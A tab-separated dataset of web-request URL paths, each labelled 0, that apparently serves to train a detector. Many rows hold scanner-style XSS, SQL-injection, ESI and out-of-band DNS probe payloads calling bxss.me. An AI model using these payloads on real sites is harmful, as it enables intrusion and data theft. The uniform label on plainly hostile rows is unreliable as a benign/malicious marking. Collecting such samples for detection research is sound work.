sentences	labels
/****/bmkx/sgaj/201812/t20181208_'""()&%<acx><script >ysri(9227)</script>.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(931)</script>?_=1630311662869 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3430)">?_=1630311871385 \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/szss/plq/xmb_gzdxb.htm \r\n\r\n 	 0
/***/col5/index.html"" and ""x""=""x \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1181725030')))>'0&type=1 \r\n\r\n 	 0
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/css/page.css \r\n\r\n 	 0
/****/swb/ltgsz.com?n=11) and 3458=(select 3458 from pg_sleep(5)) and (4012=4012 \r\n\r\n 	 0
/*****/system/2020/09/30/javascript:window.close(); \r\n\r\n 	 0
/****/consultdetails/cyprus \r\n\r\n 	 0
/******/download/downfile.jsp?classid=bxss.me&filename=ad2956b5c62a469ea6bac71f9dae4ee9.doc \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033%' or 9019=7490 and '%%'='%&owner=1707212448 \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15) and 1596=1596#&outlinepage=10 \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 8562=0545  \r\n\r\n 	 0
/******/web_front.js/"><script>alert(509)</script> \r\n\r\n 	 0
/*****/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/******/resource/code/datainput.jsp?owner=' or 3579=4925 and '1'='1 \r\n\r\n 	 0
/****/rdhy'||'/1.htm \r\n\r\n 	 0
/****/system/2021/06/18/javascript:window.close(); \r\n\r\n 	 0
/************/0""xor(if(now()=sysdate(),sleep(9),0))xor""z/jyxg/2017-02-15/406.html \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033%' and 8582=3515 and '%'='&owner=1707212448 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt/plugin/voice/voice.css \r\n\r\n 	 0
/****/byszx/201611/t20161121_76519.html?leader="".gethostbyname(lc(""hitcw"".""ltwulkbhb6cdf.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(108).chr(65).chr(104).chr(73)."" \r\n\r\n 	 0
/****/zdlygk/ncwywfgz' and 2*3*8=6*8 and 'r9sd'='r9sd/wzs/ltq/xmb_gzdxb.htm \r\n\r\n 	 0
/*******/820xrt0.php \r\n\r\n 	 0
/*/210607/index/d5bd64e8e58af018c57671623349a002'""()&%<acx><script >la0c(9234)</script>.css \r\n\r\n 	 0
/****/ssgs/kmbg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/************/template/jcse//xfs.bxss.me/16/images/ui.css \r\n\r\n 	 0
/*****/gywm/flgw/? \r\n\r\n 	 0
/****/web/search?searchword=1') and 9200=6133  \r\n\r\n 	 0
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 0
/******/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777) \r\n\r\n 	 0
/****/web/css/jquery-ui.min.css \r\n\r\n 	 0
/****/admin/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 0
/*******/17x2x.php \r\n\r\n 	 0
/****/xxgknb/2014/list'||'.html \r\n\r\n 	 0
/*******/v9egho.php \r\n\r\n 	 0
/****/gg.shtml/<img src="javascript:alert(292)"> \r\n\r\n 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270' or 9959=1321  \r\n\r\n 	 0
socket.gethostbyname('hitzq' 'ruhqorxt2bd20.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/view.js \r\n\r\n 	 0
/******/system/2008/09/08/002594449.shtml \r\n\r\n 	 0
/****/zjdt/zjdt/zcwj/16.htm \r\n\r\n 	 0
/****/bysw'""()&%<acx><script >qjl0(9840)</script>/202001/t20200119_146666.html \r\n\r\n 	 0
/****/web/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(08068)</script> \r\n\r\n 	 0
/******/index.js type=text/javascript \r\n\r\n 	 0
socket.gethostbyname(""hityv"" ""chyczyuye4225.bxss.me."")[3].to_s) ""/*******/jquery.window.js \r\n\r\n 	 0
/*******/gkmszm4x.php \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/'""()&%<acx><script >k6qi(9121)</script>/jquery.cookie.js \r\n\r\n 	 0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 0
socket.gethostbyname(""hitae"" ""trvckcse8fb63.bxss.me."")[3].to_s) ""/*******/cookie/jquery.cookie.js \r\n\r\n 	 0
/**/if(now()=sysdate(),sleep(15),0)/lib/easyui/themes/bootstrap/linkbutton.css \r\n\r\n 	 0
/*/public/viewclick/?addclick=-1); waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163 \r\n\r\n 	 0
/*****/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 0
/***********/shangpinqihuo/heisebankuai/2021-05-14/javascript:void(0) \r\n\r\n 	 0
/***/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 0
/*********/zh_cn/fuck.php \r\n\r\n 	 0
/***/col36/index.html/"><script>alert(829)</script> \r\n\r\n 	 0
/****/tpgj/zyzs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/yfyfwpt/gjjcxsdqy/ \r\n\r\n 	 0
/*******/oxakpi.php \r\n\r\n 	 0
//***********/template/jcse/110105008056111/16/images/css.js \r\n\r\n 	 0
/****/zfwjn/'.gethostbyname(lc('hittm'.'ucdonsird9785.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(85).chr(103).chr(86).'/1104/list.html \r\n\r\n 	 0
/*****/admin/dash_status.php?status_data[1]=alert(777); \r\n\r\n 	 0
/**********/system/2021/09/07/013447361'""/><img src=javascript:alert(817)>.shtml \r\n\r\n 	 0
/************/template/jcse/110105008056111//xfs.bxss.me/images/condition.js \r\n\r\n 	 0
/****/zfxxgk1/fdzdgknr/if(now()=sysdate(),sleep(12),0)/1.htm \r\n\r\n 	 0
/****/qzfwj/5619/5624/\"javascript:void(0)\" \r\n\r\n 	 0
/*****/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 0
/***/2021/10/11<esi:include src=""http://bxss.me/rpb.png""/>/art_34_242319.html \r\n\r\n 	 0
/****/kjyf/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/*****/system/2021/01/21/013323672.shtml?appscan=>"><script>alert(125)</script> \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt.js \r\n\r\n 	 0
/****/xxczh1/ywdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 0
/******/resource/storage/localupload.jsp?doaction=save&rid=1rnott09fg if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&uptoken=1ff87566684b40c688f756b86e2c3798 \r\n\r\n 	 0
/****/web/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=if(now()=sysdate(),sleep(15),0)&page=3&perpage=15&searchword=the \r\n\r\n 	 0
/*******/lq7iq7.php \r\n\r\n 	 0
/zwgk%' and 2*3*8=6*8 and 'jxva'!='jxva%/******/bzxajgc1/1.htm \r\n\r\n 	 0
/****/web/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(05961)</script> \r\n\r\n 	 0
/****/js/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jsencrypt.min.js \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=4979' and 'f'='f') -- \r\n\r\n 	 0
/****/合作伙伴一带一路新华丝路 \r\n\r\n 	 0
/****/zdlygk'||'/ncwywfgz/szss/plq/xmb_gzdxb.htm \r\n\r\n 	 0
/***/template.cfm?moduletitle=alert(777) \r\n\r\n 	 0
/**/ohac_10136/' and 'x'='x \r\n\r\n 	 0
/*****/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 0
/cgi-bin/*****/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/view.js \r\n\r\n 	 0
/****/qyjbxx/gjjj/" and "x"="y \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type[0]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1934395690')))&type[1]==1 \r\n\r\n 	 0
/**********/editor/filemanager/browser/mcpuk/connectors/php/commands/helpers/progress.cgi \r\n\r\n 	 0
/fzgn<esi:include src=""http://*******/rpb.png""/>/wzdt/ \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/analysis'""()&%<acx><script >ljha(9683)</script>/jquery.windstagball.js \r\n\r\n 	 0
/***/col50/index.html"" and ""x""=""x \r\n\r\n 	 0
/****/ssgs/zghtlxgj/ \r\n\r\n 	 0
/**/rest/prototype/1/session/check/something<img src=a onerror=alert(777)> \r\n\r\n 	 0
/******/resource/pdfjs/build/fqaabdgaaaaet1mvmlynywkaaaegaaaaygntyxabdqluaaacnaaaaujozwfk/index.jsp/*/-->'""></iframe></script></style></title></textarea><script >alert(83601)</script> \r\n\r\n 	 0
/***********/userservice.aspx?dbid=5') and 8493=8493 and ('znov'='znov \r\n\r\n 	 0
/***/index.php?c=user</textarea>--><xss_25ac001ad6d56f9c7e6e59dfefee9e86/><!--<textarea>&a=login \r\n\r\n 	 0
/***/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/****/web/search?channelid=299868%' or 1192=2096 and '%%'='%&perpage=1000 \r\n\r\n 	 0
/z'""()&%<acx><script >bery(9174)</script>/******/index/ef90f68c5578ccfd29b18250450d0233.css \r\n\r\n 	 0
/******/system/2017/10/24/javascript:void(0); \r\n\r\n 	 0
/****/js/misc/swfupload//swfupload_f8.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// \r\n\r\n 	 0
/****/index.php?title=acunetixtestb11222&action=submit \r\n\r\n 	 0
/**********/system/2011/06/29/010398786.shtml \r\n\r\n 	 0
/****/stylenopower.aspx?file=css/stylelogin) having 1=1-- \r\n\r\n 	 0
/****/gjmt/jtwxq/202012/ \r\n\r\n 	 0
/********/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 0
/*******/zb04.php \r\n\r\n 	 0
/***/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 \r\n\r\n 	 0
/*****/all/modules/civicrm/packages/openflashchart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() \r\n\r\n 	 0
/****/jtdt/2021_jtyw/202109//*/-->'""></iframe></script></style></title></textarea><script >alert(76934)</script> \r\n\r\n 	 0
/****/system/count/0036012/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/czgk/bmyjs/zzqfyxt/txxrmfy/\"javascript:void(0)\" \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/***/hanweb.min.css \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt/catesearchbtn.js \r\n\r\n 	 0
/*******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html?new="".gethostbyname(lc(""hitit"".""cubqnkey2ec7b.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(71).chr(99).chr(78)."" \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/rsrm/1.htm \r\n\r\n 	 0
/*****/admin/system.html?step=2&device=et"/><script>alert(777);</script>bh0 \r\n\r\n 	 0
/******/system/2021/09/13/javascript:void(); \r\n\r\n 	 0
/*********/*/-->'""></iframe></script></style></title></textarea><script >alert(93696)</script> \r\n\r\n 	 0
/*********/user/findpass_msg.html?ac=email and 6908=6908 \r\n\r\n 	 0
/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/cgi-bin/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0)/bzxajgc/gys.htm \r\n\r\n 	 0
/*****/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/**/aboutus/companyprofile/" and "x"="y \r\n\r\n 	 0
/****/web/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(28290)</script> \r\n\r\n 	 0
/hdjl'""()&%<acx><script >0gna(9935)</script>/****/202103/t20210303_2614145.html \r\n\r\n 	 0
/**/tips/tipsloginsubmit.action \r\n\r\n 	 0
socket.gethostbyname('hitju' 'vojvtusa13c34.bxss.me.')[3].to_s) '/******/t20210806_185416.html \r\n\r\n 	 0
/system%' and 2*3*8=6*8 and 'odnb'!='odnb%/********/js/centercutimg.js \r\n\r\n 	 0
/***/2020/if(now()=sysdate(),sleep(15),0)/15/art_31_223689.html \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new='.gethostbyname(lc('hitnc'.'vmdszddx892f2.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(107).chr(89).chr(105).chr(65).' \r\n\r\n 	 0
/*****/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 0
/******/jzx2.swf/""><script>alert(514)</script> \r\n\r\n 	 0
/****/system/2021/11/15/javascript:window.print() \r\n\r\n 	 0
/******/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_5c51cb1c64e40d44876c222814e1e3ae/><!--<textarea> \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*****/index.html \r\n\r\n 	 0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/***/0/02/04/40/2044085_113792.png \r\n\r\n 	 0
/****/20210831/javascript:void(0); \r\n\r\n 	 0
/****/gjgk/ \r\n\r\n 	 0
/******/business-area/warehouse-services/if(now()=sysdate(),sleep(6),0)-03-22/691.html \r\n\r\n 	 0
/****/ghgz/202009/t20200921_253740.html' and 'x'='y \r\n\r\n 	 0
/?/**/***/**/8=8 \r\n\r\n 	 0
/************/investment-advisory'||'/2019-04-19/270.html \r\n\r\n 	 0
/****/czgk/bmyjs/zzqfyxt/zzqgyzzqtlfy_1817/\"javascript:void(0)\" \r\n\r\n 	 0
/**/files.php?folder="">alert(777) \r\n\r\n 	 0
/**********/system/2021/10/10/javascript:void(); \r\n\r\n 	 0
/****/template.cfm?moduletitle=alert(777) \r\n\r\n 	 0
/************/template/jcse'""()&%<acx><script >v4yy(9934)</script>/website.js \r\n\r\n 	 0
/****/web/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(89676)</script> \r\n\r\n 	 0
/****/东北?page='""()&%<acx><script >daln(9185)</script> \r\n\r\n 	 0
/xxgk<esi:include src=""http://*******/rpb.png""/>/xxgknb/2012/list.html \r\n\r\n 	 0
/************/template<esi:include src=""http://bxss.me/rpb.png""/>/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 0
/****/zdlygk/ncwywfgz%' and 2*3*8=6*8 and 'osyp'!='osyp%/zws/znx/xmb_gzdxb.htm \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc' and 4064=9498 and 'hzal'='hzal \r\n\r\n 	 0
/****/system/2021/11/06/javascript:window.print() \r\n\r\n 	 0
/****/zixunpeixun.html \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219' and 5390=3653 and '1'='1&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/********/index.html/*/-->'""></iframe></script></style></title></textarea><script >alert(67798)</script> \r\n\r\n 	 0
/*****/system/2019/08/21/javascript:window.close(); \r\n\r\n 	 0
/******/system/2016/12/22/javascript:void(0); \r\n\r\n 	 0
/**/index.cfm?field="">alert(777) \r\n\r\n 	 0
/*******/cr8wlkwv.php \r\n\r\n 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1' and 8741=8741 and '1'='1 \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/*****/hfswsj/ \r\n\r\n 	 0
/tencent:/*******/?uin=2420546317&site=www.paichen.net&menu=yes) and 1=2 ( \r\n\r\n 	 0
/****/wdsjs/hfswsj/zmhdyc.html?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 0
socket.gethostbyname('hitrz' 'fhlmhwob372a1.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3.css \r\n\r\n 	 0
/****/mytag_js.php?aid=1 \r\n\r\n 	 0
/******/jslib/ckplayer/ \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' or 6798=6798  \r\n\r\n 	 0
/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/***/nbhd/opengovmsgbox.do?appid=4'and'm'='m&method=listgovmsgboxs&pagesize=3&siteid=115 \r\n\r\n 	 0
/*******/3h25mf.php \r\n\r\n 	 0
/************/'""()&%<acx><script >k6qi(9281)</script>/jcse/110105008056111/16/images/jquery.cookie.js \r\n\r\n 	 0
/******/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 0
/*****/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh<esi:include src=""http://bxss.me/rpb.png""/>_2065/list.html \r\n\r\n 	 0
/******/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 0
/zmhd' and 2*3*8=6*8 and 'fapa'='fapa/*****/hfswsj/202109/t20210906_186411.html \r\n\r\n 	 0
/****/2020wzqh/wzqh_zyjs/' and 'x'='x \r\n\r\n 	 0
/****/system/2021/12/11/javascript:window.print() \r\n\r\n 	 0
/****/jwmsxf/whlz/javascript:void(0); \r\n\r\n 	 0
/**********/system/2021/08/05/013431082.shtml \r\n\r\n 	 0
/****/ygzpxx/202010/t20201009_254278.html' and 'x'='y \r\n\r\n 	 0
/**/system/2021/01/19/javascript:void(0); \r\n\r\n 	 0
/****/新河县/*/-->'""></iframe></script></style></title></textarea><script >alert(11451)</script>?page=1 \r\n\r\n 	 0
/****/web/search?channelid=222832&outlinepage=10&page=4172&perpage=20; waitfor delay '0:0:2 \r\n\r\n 	 0
/****/zxft'""()&%<acx><script >ab03(9586)</script>/ \r\n\r\n 	 0
socket.gethostbyname(""hityq"" ""qdlmfaax96d6c.bxss.me."")[3].to_s) ""/******/searchbtn.js \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin'||'/analysis/jquery.windstagball.js \r\n\r\n 	 0
/****/system/2006/09/26/javascript:dozoom(9) \r\n\r\n 	 0
/******/n236753/n236781'||'/c1556969/content.html \r\n\r\n 	 0
/******/resource/code/datainput.jsp?owner=' or 9667=1523  \r\n\r\n 	 0
/****/xxgkml'""()&%<acx><script >vmvx(9678)</script>/zfczyjs/list.html \r\n\r\n 	 0
/wp-content/*******/csrs/akismet.php \r\n\r\n 	 0
/******/resource/js%' and 2*3*8=6*8 and '3o2v'!='3o2v%/gotopage.js \r\n\r\n 	 0
/****/web/search/search?page=3';select sleep(5) \r\n\r\n 	 0
/****/system/2016/04/21/javascript:dozoom(12) \r\n\r\n 	 0
/****/system/2016/10/27/javascript:dozoom(12) \r\n\r\n 	 0
/****/web/search?channelid=299868%' or 2121=6846 and '%'='&perpage=1000 \r\n\r\n 	 0
/****/czgk/bmyjs/rmtt/yx/\"javascript:void(0)\" \r\n\r\n 	 0
/*****/newfile.php \r\n\r\n 	 0
/****/czgk/bmjs/zzqjcyxt/hsbqrmjcy/\"javascript:void(0)\" \r\n\r\n 	 0
/****/'.gethostbyname(lc('hitti'.'dqzqvedbf25bc.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(68).chr(115).chr(71).'/201610/t20161016_531.html \r\n\r\n 	 0
/*******/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&p=1&q=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/******/1/layout.js/""><script>alert(494)</script> \r\n\r\n 	 0
/***/col3877/index.html/"><script>alert(568)</script> \r\n\r\n 	 0
/****/system/2021/12/16/javascript:window.print() \r\n\r\n 	 0
/xwdt' and 2*3*8=6*8 and 'calb'='calb/****/zjdt/gzdt.htm \r\n\r\n 	 0
/vc'""()&%<acx><script >sgmr(9944)</script>/**/lib/easyui/plugins/jquery.parser.js \r\n\r\n 	 0
/**/ourbusiness/projectcontracting/201412/t20141210_22180.html \r\n\r\n 	 0
/****/system/2021/11/29/javascript:window.close(); \r\n\r\n 	 0
socket.gethostbyname('hittx' 'lelkrjee9ff86.bxss.me.')[3].to_s) '/****/1104/list.html \r\n\r\n 	 0
/****/20201229/javascript:void(0); \r\n\r\n 	 0
/**********/system/2021/12/20/javascript:window.print() \r\n\r\n 	 0
/****/category/chukoufengxianyujing?page=1 and 6206=6206 \r\n\r\n 	 0
/*****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
/****//xfs.bxss.me/tjj/zfxxgkml_2127/xwfbh_2065/list.html \r\n\r\n 	 0
/**/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 0
/*******/nwb2q.php \r\n\r\n 	 0
/**/state/service/166/exec \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4922)</script>?_=1630312208964 \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/znjs.htm \r\n\r\n 	 0
/*******/a3okb67.php \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/bxss.me/view.js \r\n\r\n 	 0
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/jquery.waterfall.js \r\n\r\n 	 0
/****/zfwjn/1079/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3744)</script>?_=1630312029023 \r\n\r\n 	 0
/**/sydt/201808/t20180808_194915.html \r\n\r\n 	 0
/**/ui/lib/easyui/plugins"" and 2*3*8=6*8 and ""imvs""=""imvs/jquery.messager.js \r\n\r\n 	 0
/****/tu.php?aid=9090 \r\n\r\n 	 0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqkjt/\"javascript:void(0)\" \r\n\r\n 	 0
/*****/javascript/bxslider-4/jquery.bxslider.js/<img src="javascript:alert(20)"> \r\n\r\n 	 0
/****/bwcx/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/***/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(784)">?_=1630311590850 \r\n\r\n 	 0
/************/template/jcse'||'/110105008056111/16/images/plugin/voice/voice.css \r\n\r\n 	 0
/****/ztjj2022lz/lhsd/lhsdt/javascript:void(0); \r\n\r\n 	 0
/**********/system/2015/04/15/011691219.shtml \r\n\r\n 	 0
/******/system/2012/07/24/010836164.shtml \r\n\r\n 	 0
/*****/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 \r\n\r\n 	 0
/****/search.jspx?q="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""// \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml<esi:include src=""http://bxss.me/rpb.png""/>_2127/xwfbh_2065/list.html \r\n\r\n 	 0
/*******/lo0ac5w.php \r\n\r\n 	 0
/****/zdlygk/ncwywfgz'||'/ycs/lws/xmb_gzdxb.htm \r\n\r\n 	 0
/****/system/2018/02/02/javascript:window.print() \r\n\r\n 	 0
/**/ui/widgets/scrollup//xfs.bxss.me/themes/image.css \r\n\r\n 	 0
/****/zfcwhy/202107/t20210723_2938511<esi:include src=""http://bxss.me/rpb.png""/>.html \r\n\r\n 	 0
/*****/system/2020/06/24/javascript:window.print() \r\n\r\n 	 0
/***/data:image/svg xml;charset=utf-8,<svg xmlns='http://www.w3.org/2000/svg' viewbox='0 0 27 44'><path d='m0,22l22,0l2.1,2.1l4.2,22l19.9,19.9l22,44l0,22l0,22l0,22z' fill='#000000'/></svg> \r\n\r\n 	 0
socket.gethostbyname('hitvr' 'afhksgmvd8c02.bxss.me.')[3].to_s) '/***************/16/images/ui.css \r\n\r\n 	 0
/**/ui/widgets/hanweb/placeholder/placeholder"" and 2*3*8=6*8 and ""s6aq""=""s6aq.js \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==2and 3 in &i_webid[1]=3"and/**/extractvalue(1,concat(char(126),md5(1580028230)))and"&type=1 \r\n\r\n 	 0
/****/20170727/javascript:void(0); \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1%' or 4949=4949 and '%'='&token=1 \r\n\r\n 	 0
/col"" and 2*3*8=6*8 and ""vkpr""=""vkpr/******/index.html \r\n\r\n 	 0
/****/zzxxgk/tjj/tjjysqgk/gkcx/list.html?new=bxss.me \r\n\r\n 	 0
/**/system/2021/08/04/javascript:void(0); \r\n\r\n 	 0
/**/index.php?do=post&id=325&c=dt&a=goods& \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394');select pg_sleep(5)-- \r\n\r\n 	 0
/**/ui/widgets/cookie/http://bxss.me/t/fit.txt?.cookie.js \r\n\r\n 	 0
/****/qzfwj/list_1' waitfor delay '0:0:2.html \r\n\r\n 	 0
/****//xfs.bxss.me/bmleft.html \r\n\r\n 	 0
